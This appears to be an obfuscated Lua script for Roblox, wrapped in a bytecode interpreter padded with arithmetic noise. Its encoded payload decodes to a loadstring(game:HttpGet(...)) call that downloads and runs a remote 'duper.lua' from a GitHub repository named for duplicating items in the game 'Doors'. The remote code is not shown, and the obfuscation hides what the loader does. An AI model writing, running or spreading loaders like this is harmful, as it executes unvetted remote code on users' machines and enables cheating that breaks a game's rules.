local v0 = tonumber;
local v1 = string.byte;
local v2 = string.char;
local v3 = string.sub;
local v4 = string.gsub;
local v5 = string.rep;
local v6 = table.concat;
local v7 = table.insert;
local v8 = math.ldexp;
local v9 = getfenv or function()
	return _ENV;
end;
local v10 = setmetatable;
local v11 = pcall;
local v12 = select;
local v13 = unpack or table.unpack;
local v14 = tonumber;
local function v15(v16, v17, ...)
	local v18 = 1;
	local v19;
	v16 = v4(v3(v16, 5), "..", function(v30)
		if (v1(v30, 2) == 81) then
			v19 = v0(v3(v30, 1, 1));
			return "";
		else
			local v88 = v2(v0(v30, 16));
			if v19 then
				local v109 = v5(v88, v19);
				v19 = nil;
				return v109;
			else
				return v88;
			end
		end
	end);
	local function v20(v31, v32, v33)
		if v33 then
			local v89 = 0 - 0;
			local v90;
			while true do
				if (v89 == 0) then
					v90 = (v31 / ((5 - 3) ^ (v32 - (1 - 0)))) % (2 ^ (((v33 - (2 - 1)) - (v32 - 1)) + (620 - (555 + 64))));
					return v90 - (v90 % ((1809 - (282 + 595)) - (857 + (1711 - (1523 + 114)))));
				end
			end
		else
			local v91 = ((513 + 57) - ((523 - 156) + 201)) ^ (v32 - (928 - (214 + 713)));
			return (((v31 % (v91 + v91)) >= v91) and (1 + 0)) or (0 + 0);
		end
	end
	local function v21()
		local v34 = 1065 - (16 + 52 + 997);
		local v35;
		while true do
			if (v34 == (1270 - (226 + 1044))) then
				v35 = v1(v16, v18, v18);
				v18 = v18 + (4 - 3);
				v34 = 118 - (32 + (1042 - (892 + 65)));
			end
			if (v34 == (1 + 0)) then
				return v35;
			end
		end
	end
	local function v22()
		local v36, v37 = v1(v16, v18, v18 + (4 - 2));
		v18 = v18 + (3 - 1);
		return (v37 * 256) + v36;
	end
	local function v23()
		local v38, v39, v40, v41 = v1(v16, v18, v18 + (4 - 1));
		v18 = v18 + (354 - (87 + 263));
		return (v41 * (16777396 - ((164 - 97) + 113))) + (v40 * (48056 + 17480)) + (v39 * 256) + v38;
	end
	local function v24()
		local v42 = v23();
		local v43 = v23();
		local v44 = 1 + 0;
		local v45 = (v20(v43, 1, 79 - 59) * ((954 - (802 + (168 - (10 + 8)))) ^ (85 - 53))) + v42;
		local v46 = v20(v43, 21, (211 - 156) - 24);
		local v47 = ((v20(v43, 24 + 8) == (998 - ((1357 - (416 + 26)) + 82))) and -1) or (2 - 1);
		if (v46 == (0 + 0)) then
			if (v45 == (0 - (0 - 0))) then
				return v47 * 0;
			else
				v46 = 1188 - (1069 + 118);
				v44 = 0 - 0;
			end
		elseif (v46 ~= (4477 - 2430)) then
		else
			return ((v45 == (0 + 0)) and (v47 * ((1 - (0 + 0)) / (0 + 0)))) or (v47 * NaN);
		end
		return v8(v47, v46 - 1023) * (v44 + (v45 / ((793 - (368 + 423)) ^ (163 - 111))));
	end
	local function v25(v48)
		local v49 = 0 - 0;
		local v50;
		local v51;
		while true do
			if (v49 == 3) then
				return v6(v51);
			end
			if (v49 ~= ((258 + 181) - (145 + 293))) then
			else
				v50 = v3(v16, v18, (v18 + v48) - (431 - (44 + 386)));
				v18 = v18 + v48;
				v49 = 1488 - ((3643 - 2645) + 488);
			end
			if (v49 ~= (7 - 5)) then
			else
				v51 = {};
				for v110 = 1 + 0, #v50 do
					v51[v110] = v2(v1(v3(v50, v110, v110)));
				end
				v49 = (862 - (814 + 45)) + 0;
			end
			if (v49 ~= (772 - (201 + 571))) then
			else
				v50 = nil;
				if not v48 then
					v48 = v23();
					if (v48 ~= (1138 - (116 + 1022))) then
					else
						return "";
					end
				end
				v49 = 4 - 3;
			end
		end
	end
	local v26 = v23;
	local function v27(...)
		return {...}, v12("#", ...);
	end
	local function v28()
		local v52 = (function()
			return function(v92, v93, v94, v95, v96, v97, v98, v99, v100)
				local v101 = (function()
					return 0 + 0;
				end)();
				local v92 = (function()
					return;
				end)();
				local v93 = (function()
					return;
				end)();
				while true do
					if (v101 ~= (0 - 0)) then
					else
						local v116 = (function()
							return 0 - 0;
						end)();
						while true do
							if (v116 == 1) then
								v101 = (function()
									return 375 - (123 + 251);
								end)();
								break;
							end
							if (v116 ~= 0) then
							else
								v92 = (function()
									return 0 - 0;
								end)();
								v93 = (function()
									return nil;
								end)();
								v116 = (function()
									return 699 - (208 + 490);
								end)();
							end
						end
					end
					if (v101 ~= 1) then
					else
						local v117 = (function()
							return 0 + 0;
						end)();
						while true do
							if (v117 ~= 0) then
							else
								while true do
									if (v92 == (0 + 0)) then
										v93 = (function()
											return v94();
										end)();
										if (v95(v93, #"[", #"!") ~= 0) then
										else
											local v163 = (function()
												return 0;
											end)();
											local v164 = (function()
												return;
											end)();
											local v165 = (function()
												return;
											end)();
											local v166 = (function()
												return;
											end)();
											while true do
												if (v163 ~= 0) then
												else
													local v168 = (function()
														return 836 - (660 + 176);
													end)();
													while true do
														if (0 ~= v168) then
														else
															v164 = (function()
																return v95(v93, 2, #"91(");
															end)();
															v165 = (function()
																return v95(v93, #"asd1", 1 + 5);
															end)();
															v168 = (function()
																return 1;
															end)();
														end
														if (v168 ~= 1) then
														else
															v163 = (function()
																return 203 - (14 + 188);
															end)();
															break;
														end
													end
												end
												if (v163 ~= (676 - (534 + 141))) then
												else
													local v169 = (function()
														return 0;
													end)();
													while true do
														if (v169 ~= (1 + 0)) then
														else
															v163 = (function()
																return 2;
															end)();
															break;
														end
														if (v169 ~= (0 + 0)) then
														else
															v166 = (function()
																return {v96(),v96(),nil,nil};
															end)();
															if (v164 == (0 - 0)) then
																local v174 = (function()
																	return 0 - 0;
																end)();
																local v175 = (function()
																	return;
																end)();
																while true do
																	if (v174 ~= (0 - 0)) then
																	else
																		v175 = (function()
																			return 0 + 0;
																		end)();
																		while true do
																			if (v175 ~= 0) then
																			else
																				v166[#"91("] = (function()
																					return v96();
																				end)();
																				v166[#".dev"] = (function()
																					return v96();
																				end)();
																				break;
																			end
																		end
																		break;
																	end
																end
															elseif (v164 == #",") then
																v166[#"asd"] = (function()
																	return v97();
																end)();
															elseif (v164 == (2 + 0)) then
																v166[#"-19"] = (function()
																	return v97() - (2 ^ (412 - (115 + 281)));
																end)();
															elseif (v164 ~= #"asd") then
															else
																local v180 = (function()
																	return 0;
																end)();
																local v181 = (function()
																	return;
																end)();
																while true do
																	if (v180 ~= 0) then
																	else
																		v181 = (function()
																			return 0 - 0;
																		end)();
																		while true do
																			if (v181 ~= (0 + 0)) then
																			else
																				v166[#"gha"] = (function()
																					return v97() - ((4 - 2) ^ 16);
																				end)();
																				v166[#".dev"] = (function()
																					return v96();
																				end)();
																				break;
																			end
																		end
																		break;
																	end
																end
															end
															v169 = (function()
																return 3 - 2;
															end)();
														end
													end
												end
												if (v163 ~= (870 - (550 + 317))) then
												else
													if (v95(v165, #"91(", #"19(") ~= #"<") then
													else
														v166[#"xnxx"] = (function()
															return v98[v166[#"0313"]];
														end)();
													end
													v99[v100] = (function()
														return v166;
													end)();
													break;
												end
												if (v163 ~= 2) then
												else
													if (v95(v165, #"!", #">") ~= #"|") then
													else
														v166[2 - 0] = (function()
															return v98[v166[2 - 0]];
														end)();
													end
													if (v95(v165, 5 - 3, 2) ~= #"~") then
													else
														v166[#"91("] = (function()
															return v98[v166[#"xxx"]];
														end)();
													end
													v163 = (function()
														return 3;
													end)();
												end
											end
										end
										break;
									end
								end
								return v92, v93, v94, v95, v96, v97, v98, v99, v100;
							end
						end
					end
				end
			end;
		end)();
		local v53 = (function()
			return function(v102, v103, v104)
				local v105 = (function()
					return 0;
				end)();
				while true do
					if (0 ~= v105) then
					else
						local v118 = (function()
							return 285 - (134 + 151);
						end)();
						local v119 = (function()
							return;
						end)();
						while true do
							if (v118 ~= (1665 - (970 + 695))) then
							else
								v119 = (function()
									return 0 - 0;
								end)();
								while true do
									if (v119 ~= 0) then
									else
										local v159 = (function()
											return 0;
										end)();
										while true do
											if (0 ~= v159) then
											else
												v102[v103 - #"}"] = (function()
													return v104();
												end)();
												return v102, v103, v104;
											end
										end
									end
								end
								break;
							end
						end
					end
				end
			end;
		end)();
		local v54 = (function()
			return {};
		end)();
		local v55 = (function()
			return {};
		end)();
		local v56 = (function()
			return {};
		end)();
		local v57 = (function()
			return {v54,v55,nil,v56};
		end)();
		local v58 = (function()
			return v23();
		end)();
		local v59 = (function()
			return {};
		end)();
		for v67 = #"\\", v58 do
			local v68 = (function()
				return 0 - 0;
			end)();
			local v69 = (function()
				return;
			end)();
			local v70 = (function()
				return;
			end)();
			local v71 = (function()
				return;
			end)();
			while true do
				if (v68 ~= 0) then
				else
					v69 = (function()
						return 0;
					end)();
					v70 = (function()
						return nil;
					end)();
					v68 = (function()
						return 1;
					end)();
				end
				if (v68 ~= (1 - 0)) then
				else
					v71 = (function()
						return nil;
					end)();
					while true do
						if (v69 == (0 - 0)) then
							local v120 = (function()
								return 1824 - (1195 + 629);
							end)();
							while true do
								if (v120 ~= (1 - 0)) then
								else
									v69 = (function()
										return 242 - (187 + 54);
									end)();
									break;
								end
								if (v120 == 0) then
									v70 = (function()
										return v21();
									end)();
									v71 = (function()
										return nil;
									end)();
									v120 = (function()
										return 781 - (162 + 618);
									end)();
								end
							end
						end
						if (v69 ~= (1 + 0)) then
						else
							if (v70 == #"{") then
								v71 = (function()
									return v21() ~= 0;
								end)();
							elseif (v70 == (2 + 0)) then
								v71 = (function()
									return v24();
								end)();
							elseif (v70 ~= #"19(") then
							else
								v71 = (function()
									return v25();
								end)();
							end
							v59[v67] = (function()
								return v71;
							end)();
							break;
						end
					end
					break;
				end
			end
		end
		v57[#"xxx"] = (function()
			return v21();
		end)();
		for v72 = #">", v23() do
			FlatIdent_1076E, Descriptor, v21, v20, v22, v23, v59, v54, v72 = (function()
				return v52(FlatIdent_1076E, Descriptor, v21, v20, v22, v23, v59, v54, v72);
			end)();
		end
		for v73 = #"/", v23() do
			v55, v73, v28 = (function()
				return v53(v55, v73, v28);
			end)();
		end
		return v57;
	end
	local function v29(v61, v62, v63)
		local v64 = v61[1 - 0];
		local v65 = v61[2 - 0];
		local v66 = v61[(1901 - (106 + 1794)) + 2];
		return function(...)
			local v74 = v64;
			local v75 = v65;
			local v76 = v66;
			local v77 = v27;
			local v78 = 1;
			local v79 = -(1637 - (1373 + 263));
			local v80 = {};
			local v81 = {...};
			local v82 = v12("#", ...) - 1;
			local v83 = {};
			local v84 = {};
			for v106 = 1000 - (451 + 549), v82 do
				if ((v106 >= v76) or (4277 < 2989)) then
					v80[v106 - v76] = v81[v106 + 1 + 0 + 0];
				else
					v84[v106] = v81[v106 + (1 - 0)];
				end
			end
			local v85 = (v82 - v76) + 1;
			local v86;
			local v87;
			while true do
				v86 = v74[v78];
				v87 = v86[1 - 0];
				if (v87 <= 3) then
					if ((v87 <= (1385 - (746 + 638))) or (870 >= 4149)) then
						if (v87 == (0 + 0)) then
							v84[v86[2 - 0]] = v86[(87 + 257) - (218 + 123)];
						else
							local v124 = v86[1583 - (1535 + 46)];
							v84[v124] = v84[v124](v13(v84, v124 + (2 - 1) + 0, v79));
						end
					elseif (v87 == 2) then
						local v126;
						local v127, v128;
						local v129;
						local v130;
						v84[v86[1 + 1]] = {};
						v78 = v78 + 1;
						v86 = v74[v78];
						v84[v86[2]] = v63[v86[563 - (306 + 254)]];
						v78 = v78 + 1 + 0;
						v86 = v74[v78];
						v84[v86[3 - 1]] = v63[v86[3]];
						v78 = v78 + (1468 - ((2434 - 1535) + 568));
						v86 = v74[v78];
						v130 = v86[2 + 0];
						v129 = v84[v86[7 - 4]];
						v84[v130 + (604 - (268 + 335))] = v129;
						v84[v130] = v129[v86[294 - (60 + 230)]];
						v78 = v78 + (573 - (426 + 146));
						v86 = v74[v78];
						v84[v86[1 + 1]] = v86[1459 - ((396 - (4 + 110)) + 1174)];
						v78 = v78 + (812 - (569 + 242));
						v86 = v74[v78];
						v130 = v86[2];
						v127, v128 = v77(v84[v130](v13(v84, v130 + (2 - 1), v86[1 + 2])));
						v79 = (v128 + v130) - (1025 - (706 + 318));
						v126 = (1835 - (57 + 527)) - (721 + 530);
						for v152 = v130, v79 do
							v126 = v126 + (1272 - (945 + (1753 - (41 + 1386))));
							v84[v152] = v127[v126];
						end
						v78 = v78 + ((105 - (17 + 86)) - 1);
						v86 = v74[v78];
						v130 = v86[2 + 0];
						v84[v130] = v84[v130](v13(v84, v130 + (701 - (271 + 292 + 137)), v79));
						v78 = v78 + 1 + 0;
						v86 = v74[v78];
						v84[v86[(3349 - 1847) - (1408 + 92)]]();
						v78 = v78 + 1;
						v86 = v74[v78];
						do
							return;
						end
					else
						v84[v86[1088 - (461 + 625)]] = v63[v86[1291 - (993 + 295)]];
					end
				elseif (v87 <= (1 + 4)) then
					if (v87 == (1175 - (418 + 753))) then
						v84[v86[5 - 3]]();
					else
						v84[v86[1 + 1]] = {};
					end
				elseif (v87 <= (1 + 5)) then
					local v147 = v86[(167 - (122 + 44)) + 1];
					local v148 = v84[v86[1 + 2]];
					v84[v147 + (530 - (406 + 123))] = v148;
					v84[v147] = v148[v86[1773 - (1749 + 20)]];
				elseif (v87 > (2 + (8 - 3))) then
					local v155 = v86[1324 - (1249 + 73)];
					local v156, v157 = v77(v84[v155](v13(v84, v155 + 1 + 0, v86[1148 - (466 + 679)])));
					v79 = (v157 + v155) - 1;
					local v158 = 0;
					for v160 = v155, v79 do
						v158 = v158 + (2 - 1);
						v84[v160] = v156[v158];
					end
				else
					do
						return;
					end
				end
				v78 = v78 + ((6 - 4) - 1);
			end
		end;
	end
	return v29(v28(), {}, v17)(...);
end
return v15("LOL!043Q00030A3Q006C6F6164737472696E6703043Q0067616D6503073Q00482Q7470476574035E3Q00682Q7470733A2Q2F7261772E67697468756275736572636F6E74656E742E636F6D2F4E612Q786F5265616C2F442Q6F72732D5265766976652D4475706C69636174696F6E2F726566732F68656164732F6D61696E2F64757065722E6C756100094Q00027Q00122Q000100013Q00122Q000200023Q00202Q00020002000300122Q000400046Q000200046Q00013Q00024Q0001000100016Q00017Q00", v9(), ...);
